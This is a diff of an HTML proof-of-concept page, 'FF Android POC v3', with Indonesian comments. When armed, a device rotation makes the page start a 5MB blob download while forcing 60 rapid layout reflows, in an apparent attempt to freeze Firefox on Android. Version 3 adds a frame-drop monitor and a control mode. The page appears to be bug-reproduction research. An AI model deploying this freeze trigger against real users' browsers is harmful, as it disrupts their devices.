@@ -2,59 +2,104 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FF Android POC v2</title>
+  <title>FF Android POC v3</title>
   <style>
     body { font-family: monospace; background: #111; color: #0f0; padding: 10px; }
     button { padding: 14px; font-size: 16px; width: 100%; margin: 4px 0; }
-    #log { font-size: 11px; border: 1px solid #0f0; padding: 8px; min-height: 120px; margin-top: 8px; }
+    #log { font-size: 11px; border: 1px solid #0f0; padding: 8px; min-height: 120px; margin-top: 8px; max-height: 200px; overflow-y: auto; }
     .heavy { height: 400vh; background: repeating-linear-gradient(45deg,#1a1a1a,#2a2a2a 8px); }
   </style>
 </head>
 <body>
-<h3>FF Android Freeze POC v2</h3>
-<p style="color:yellow;font-size:13px">
-  ⚠️ Tap "Arm POC" → lalu <b>putar device</b> secara fisik → freeze akan terjadi saat download + rotasi bersamaan
-</p>
-
-<button onclick="armPOC()">🔴 Arm POC (lalu putar device)</button>
-<button onclick="triggerDownloadNow()">⬇️ Manual: Trigger Download Saja</button>
-
+<h3>FF Android POC v3</h3>
+<button onclick="armPOC()">🔴 Arm POC</button>
+<button onclick="armControl()">⚪ Arm CONTROL (tanpa hammer)</button>
+<button onclick="resetAll()">🔁 Reset</button>
 <div id="log">Waiting...</div>
 <div class="heavy"></div>
 
 <script>
+let armed = false;
+let controlMode = false;
+let frameDrops = 0;
+let lastFrame = 0;
+let rafHandle = null;
+
 const log = (m) => {
   const d = document.getElementById('log');
   d.innerHTML += `[${(performance.now()|0)}ms] ${m}<br>`;
   d.scrollTop = d.scrollHeight;
 };
 
-let armed = false;
-
-// Dengarkan orientasi fisik
-window.addEventListener('orientationchange', () => {
-  log('[!] orientationchange → ' + (screen.orientation?.type ?? window.orientation));
-  if (armed) {
-    log('[*] ARMED: memicu download + hammer bersamaan!');
-    triggerDownloadNow();
-    hammerLayout();
+// ===== Frame drop detector =====
+function startFrameMonitor() {
+  lastFrame = performance.now();
+  frameDrops = 0;
+  
+  function tick(now) {
+    const delta = now - lastFrame;
+    // Frame > 100ms = jank berat / freeze
+    if (delta > 100) {
+      frameDrops++;
+      log(`⚠️ FRAME DROP: ${delta.toFixed(0)}ms gap (total drops: ${frameDrops})`);
+    } else if (delta > 50) {
+      log(`⚡ Jank ringan: ${delta.toFixed(0)}ms`);
+    }
+    lastFrame = now;
+    rafHandle = requestAnimationFrame(tick);
   }
-});
-
-window.addEventListener('resize', () => {
-  if (armed) {
-    log('[resize] ' + window.innerWidth + 'x' + window.innerHeight);
-  }
-});
-
-function armPOC() {
-  armed = true;
-  log('[+] POC ARMED — sekarang putar device secara fisik');
-  log('[*] Saat kamu rotate, download + reflow akan auto-terpicu');
+  rafHandle = requestAnimationFrame(tick);
+  log('[*] Frame monitor started');
 }
 
-function triggerDownloadNow() {
-  // 5MB blob → download bar muncul lebih lama
+function stopFrameMonitor() {
+  if (rafHandle) cancelAnimationFrame(rafHandle);
+  log(`[*] Frame monitor stopped — total drops: ${frameDrops}`);
+}
+
+// ===== Orientation listener =====
+window.addEventListener('orientationchange', () => {
+  const type = screen.orientation?.type ?? window.orientation;
+  log(`[!] orientationchange → ${type}`);
+  
+  if (!armed && !controlMode) return;
+  
+  if (controlMode) {
+    log('[CONTROL] Tidak ada hammer — hanya download');
+    triggerDownload();
+    return;
+  }
+  
+  // Mode POC penuh
+  triggerDownload();
+  hammerLayout();
+});
+
+// ===== Arm functions =====
+function armPOC() {
+  armed = true;
+  controlMode = false;
+  log('[+] ARMED (full POC) — rotate device sekarang');
+  startFrameMonitor();
+}
+
+function armControl() {
+  armed = false;
+  controlMode = true;
+  log('[+] CONTROL MODE — download saja tanpa hammer');
+  startFrameMonitor();
+}
+
+function resetAll() {
+  armed = false;
+  controlMode = false;
+  frameDrops = 0;
+  stopFrameMonitor();
+  document.getElementById('log').innerHTML = 'Reset. Waiting...<br>';
+}
+
+// ===== Download =====
+function triggerDownload() {
   const buf = new Uint8Array(5 * 1024 * 1024).fill(65);
   const blob = new Blob([buf], { type: 'application/octet-stream' });
   const url = URL.createObjectURL(blob);
@@ -68,13 +113,17 @@ function triggerDownloadNow() {
   log('[+] Download 5MB triggered');
 }
 
+// ===== Layout hammer =====
 function hammerLayout() {
-  log('[*] Layout hammer: 60 reflows @ 16ms');
+  log('[*] Hammer started');
   let i = 0;
   const t = setInterval(() => {
     void document.body.getBoundingClientRect();
     document.documentElement.style.fontSize = (14 + (i % 2)) + 'px';
-    if (++i >= 60) { clearInterval(t); log('[*] Hammer selesai'); }
+    if (++i >= 60) {
+      clearInterval(t);
+      log('[*] Hammer selesai');
+    }
   }, 16);
 }
 </script>
